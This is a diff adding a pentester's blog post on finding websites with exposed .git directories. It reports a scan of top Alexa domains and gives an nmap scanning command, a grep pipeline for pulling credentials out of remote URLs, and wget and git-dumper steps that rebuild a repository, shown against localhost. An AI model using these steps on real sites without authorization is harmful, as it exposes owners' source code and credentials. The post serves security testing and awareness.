@@ -1,0 +1,85 @@
+I"�<p>Hello folks,</p>
+
+<p>Last week, while i was doing recon on some websites, i noticed that we can still found some versioning repositories in production. I found some classic <strong>.git</strong> exposed, and in a lesser extent some <strong>.svn</strong> directories. I decided to gather a bunch of websites caught in the TOP Alexa in order to look for the proportion of .git exposed; with <strong>112332</strong> domains scanned (mixed TLDs), i found <strong>453</strong> .git exposed, which is only <strong>0.4%</strong>. Not bad.</p>
+
+<p>How to scan for web exposed git directories:<br />
+<code class="language-plaintext highlighter-rouge">nmap --open -PN -n -p80,81,82,8000,8080,443,8443,9443 --script http-git -oA http-git -iL domains.lst</code><br />
+<!--more--></p>
+
+<p><em>N.B: this NSE script will perform HTTP requests thanks to input FQDNs (vhosting)</em></p>
+
+<p>Some developers may clone repository specifying their login and password as part of the url, setting this remote origin in the git configuration. For example, once your nmap done, you can spot some login:password playing with this command:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ grep -A1 Remotes http-git.nmap | grep -E ":.*:[^:]*@.*" | awk '{print $2}'
+https://apixxxxxx:[redacted]@github.com/apixxxxxx/apixxxxxx.git
+http://deploy:[redacted]@10.0.0.4:7990/scm/[redacted]/portal.git
+...
+</code></pre></div></div>
+
+<p>However i was looking for other information, for example:</p>
+<ul>
+  <li>repository’s activity; last commit date for each branch</li>
+  <li>repo directory traversal (great to download the whole repo)</li>
+  <li>highlights remote url</li>
+  <li>displays .git/config and .gitignore files</li>
+</ul>
+
+<p>Knowing a bit of a <a href="https://git-scm.com/docs/gitrepository-layout">.git repository layout</a> will allow to easily retrieve this information even if you don’t have any directory traversal. That’s why i created a bash script gathering this information which you can find <a href="https://github.com/phackt/pentest/blob/master/fingerprint/web/git.sh">here</a>.</p>
+
+<p><img src="http://localhost:4000/public/images/git-exposed/gittool.png" alt="image1" /></p>
+
+<p>If a repository seems interesting and has directory traversal and/or leaks in its remote url some credentials, you can simply download or clone the repository. For example to download the whole repo you can do the following:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ wget --recursive --no-parent http://localhost/phackt.github.io/.git/ &amp;&amp; \
+cd localhost/phackt.github.io &amp;&amp; \
+git reset --hard
+</code></pre></div></div>
+
+<p>Now what happens if you didn’t find any creds (most of the cases) and <strong>directory traversal is not enabled</strong> ? I will not reinvent the wheel and advice you to read this <a href="https://en.internetwache.org/dont-publicly-expose-git-or-how-we-downloaded-your-websites-sourcecode-an-analysis-of-alexas-1m-28-07-2015/">article</a> amongst others.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ curl -I http://localhost/phackt.github.io/.git/
+HTTP/1.1 403 Forbidden
+Date: Sat, 11 Aug 2018 17:00:04 GMT
+Server: Apache/2.4.33 (Debian)
+Content-Type: text/html; charset=iso-8859-1
+</code></pre></div></div>
+
+<p>I gave a try to another <a href="https://github.com/arthaud/git-dumper">git dumper tool</a>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ git clone https://github.com/arthaud/git-dumper.git &amp;&amp; cd git-dumper
+$ pip install -r requirements.txt
+$ ./git-dumper.py http://localhost/phackt.github.io/.git/ /tmp/repo
+[-] Testing http://localhost/phackt.github.io/.git/HEAD [200]
+[-] Testing http://localhost/phackt.github.io/.git/ [403]
+[-] Fetching common files
+[-] Fetching http://localhost/phackt.github.io/.git/COMMIT_EDITMSG [200]
+[-] Fetching http://localhost/phackt.github.io/.git/description [200]
+[-] Fetching http://localhost/phackt.github.io/.git/hooks/commit-msg.sample [200]
+[-] Fetching http://localhost/phackt.github.io/.git/hooks/post-commit.sample [302]
+[-] Fetching http://localhost/phackt.github.io/.git/hooks/post-receive.sample [302]
+[-] Fetching http://localhost/phackt.github.io/.git/hooks/applypatch-msg.sample [200]
+[-] Fetching http://localhost/phackt.github.io/.git/hooks/pre-applypatch.sample [200]
+[-] Fetching http://localhost/phackt.github.io/.git/hooks/pre-commit.sample [200]
+...
+[-] Running git checkout .
+</code></pre></div></div>
+
+<p>We can now inspect our freshly rebuilt repository:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cd /tmp/repo &amp;&amp; ls -1
+about.md
+categories.md
+CNAME
+_config.yml
+feed.xml
+_includes
+index.html
+_layouts
+POC
+_posts
+public
+_sass
+</code></pre></div></div>
+
+<p>See you soon,<br />
+Cheers.</p>
+:ET
